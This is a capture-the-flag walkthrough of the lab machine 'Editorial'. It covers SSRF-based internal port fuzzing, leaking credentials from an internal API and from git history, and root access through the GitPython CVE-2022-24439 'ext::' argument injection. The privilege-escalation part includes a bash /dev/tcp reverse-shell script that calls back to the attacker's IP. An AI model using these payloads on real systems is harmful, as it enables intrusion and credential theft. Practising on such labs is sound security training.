## Intro

tags: #linux #WebApp #SSRF #git #3rd-party-vuln-app #OSCPpath #easy  

------
# Reconnaissance

lets initialize some variables for quick reference 
```shell
source basher target1 10.129.53.169 [IP]
source basher host1 editorial.htb [host]
```

Add machine to `/etc/hosts`
```shell
echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
tarting Nmap 7.98 ( https://nmap.org ) at 2026-08-08 12:17 -0400
Nmap scan report for 10.129.53.169
Host is up (0.075s latency).
Not shown: 61621 closed tcp ports (reset), 3912 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-08 12:18 -0400
Nmap scan report for editorial.htb (10.129.53.169)
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.20 ms 10.10.14.1
2   48.77 ms editorial.htb (10.129.53.169)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
```


## Directories

```shell
fuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```
no new dirs found

## SSRF

![](MediaFiles/Pasted%20image%2020260808194721.png)
send book info does nothing

hitting preview tho is interesting
![](MediaFiles/Pasted%20image%2020260808200059.png)

ssrf confirmed:
```
http://10.10.15.168:9002/book
```
got response
```shell
─$ python3 -m http.server 9002
Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
10.129.53.169 - - [08/Aug/2026 13:03:23] code 404, message File not found
10.129.53.169 - - [08/Aug/2026 13:03:23] "GET /book HTTP/1.1" 404 -

```
we get a response in ~220 ms

what if we put localhost?
![](MediaFiles/Pasted%20image%2020260808200516.png)
we get a much more delayed answer ~20k ms

This gap in time is very indicative and helpful!

so lets fuzz some ports internally via the SSRF

save the request from burp towards /upload-cover with FUZZ parameter
![](MediaFiles/Pasted%20image%2020260808200813.png)

and then build a wordlist
```bash
seq 1 10000 > ports.txt
```

```bash
ffuf -u http://editorial.htb/upload-cover \
     -request upload.req \
     -w ports.txt \
     -fr /static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg \
     -o ffuf-upload-cover
```
and we see exactly one port found:
```shell
5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 173ms]
```
what is this port? thats a flask development server default

## Mapping the internal API

lets place :5000 on the url, and specify a file we wanna "leak"

Point the SSRF at the service root, then fetch the stored file it hands back:
```bash
curl -s "http://editorial.htb/$(curl -s http://editorial.htb/upload-cover \
  -F 'bookurl=http://127.0.0.1:5000/' \
  -F 'bookfile=@/dev/null')" | jq .
```

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```


Each subsequent endpoint is queried the same way, changing only the `bookurl`. `/api/latest/metadata/changelog` lists the version history:
```shell
curl -s "http://editorial.htb/$(curl -s http://editorial.htb/upload-cover \   
  -F 'bookurl=http://127.0.0.1:5000//api/latest/metadata/changelog' \
  -F 'bookfile=@/dev/null')" | jq .
```

```json
[
  {
    "1": {
      "api_route": "/api/v1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial El Tiempo Por Arriba"
    }
  },
  {
    "1.1": {
      "api_route": "/api/v1.1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Ed Tiempo Arriba"
    }
  },
  {
    "1.2": {
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v1.2/metadata/"
    }
  },
  {
    "2": {
      "contact_email": "info@tiempoarriba.moc.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v2/metadata/"
    }
  }
]
```

### Leaking creds

```shell
curl -s http://editorial.htb/upload-cover \
     -F 'bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors' \
     -F 'bookfile=@/dev/null'
```
result
```shell
static/uploads/a2252a04-73a9-4bec-9c6c-62616363dfa7
```
lets see its contents now:
```shell
curl -s http://editorial.htb/static/uploads/a2252a04-73a9-4bec-9c6c-62616363dfa7 | jq .
```
result
```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."  
}
```

#### creds obtained

```shell
dev
dev080217_devAPI!@
```

```shell
source basher user1 dev [notable]
source basher pass1 'dev080217_devAPI!@' [notable]
source basher creds1 $user1:$pass1 [Credentials]
```
so far the basher table looks like this
```shell
source basher --table

IP            host          Credentials            
------------- ------------- ---------------------- 
10.129.53.169 editorial.htb dev:dev080217_devAPI!@ 
```

## Shell as dev

```shell
ssh dev@editorial.htb
The authenticity of host 'editorial.htb (10.129.53.169)' can't be established.
ED25519 key fingerprint is: SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editorial.htb' (ED25519) to the list of known hosts.
dev@editorial.htb's password: 
Permission denied, please try again.
dev@editorial.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug  8 06:10:24 PM UTC 2026

  System load:           0.05
  Usage of /:            60.8% of 6.35GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.53.169
  IPv6 address for eth0: dead:beef::a0de:adff:fe10:6964


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ cat user.txt
e24e591e4757196ae58720625b902940
dev@editorial:~$ 

```

# Privesc

## Sudo -l
```shell
dev@editorial:~$ sudo -l
[sudo] password for dev: 
Sorry, user dev may not run sudo on editorial.
```

## Filesystem enumeration

```shell
dev@editorial:~$ ls
apps  user.txt
dev@editorial:~$ cd apps
dev@editorial:~/apps$ ls
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
dev@editorial:~/apps$ cd .git
```

## Inspecting git 

```shell
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
```

on `commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` we can see `change(api): downgrading prod to dev` let's take a look

```shell
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

```shell
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------

```
we found prod creds

#### creds obtained 

```
prod
080217_Producti0n_2023!@
```

```shell
source basher user2 prod [notable]
source basher pass2 '080217_Producti0n_2023!@' [notable]
source basher creds2 $user2:$pass2 [Credentials]
```
so far the basher table looks like this
```shell
source basher --table

IP            host          Credentials                   
------------- ------------- ----------------------------- 
10.129.53.169 editorial.htb dev:dev080217_devAPI!@        
                            prod:080217_Producti0n_2023!@ 

```
change to prod user
```shell
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ 
```

## sudo -l
```shell
prod@editorial:/home/dev/apps$ sudo -l
[sudo] password for prod: 
Sorry, try again.
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```
this scripts clones a git repo

## Custom script

lets inspect this python file
```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

tried /etc/passwd
```shell
prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py /etc/passwd
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

tried root
```shell
prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py /root
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
cat: /root: Permission denied
```
hm this is not the way, lets try other stuff

## Vulnerable 3rd party app

### Gitpython version

```shell
prod@editorial:~$ git --version
git version 2.34.1
```
this was not usefull, then found others too
```shell
prod@editorial:~$ pip list | grep git
gitdb                 4.0.10
prod@editorial:~$ pip list | grep Git
GitPython             3.1.29
```
By searching gitpython version online i found a cve related to it
https://www.cve.org/CVERecord?id=CVE-2022-24439

### Leak root flag

poc
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
```shell
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```
got root flag
```shell
prod@editorial:~$ cat /tmp/root
bb3f25847e346e0fe6729534d19b886a
```

## Shell as root

on the target
```shell
cat > /tmp/root-shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.168/9001 0>&1
EOF

chmod +x /tmp/root-shell.sh
```
execute
```shell
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/root-shell.sh'
```
got root shell back
```shell
└─$ nc -lvnp 9001                                                                                     
listening on [any] 9001 ...
connect to [10.10.15.168] from (UNKNOWN) [10.129.53.169] 47696
root@editorial:/opt/internal_apps/clone_changes# whoami
whoami
root
root@editorial:/opt/internal_apps/clone_changes# cd
cd
root@editorial:~# cat root.txt
cat root.txt
bb3f25847e346e0fe6729534d19b886a
root@editorial:~# 
```

---
# Summary



-----
# Sidenotes


A really good writeup a came across
https://radiantsec.io/docs/htb/editorial/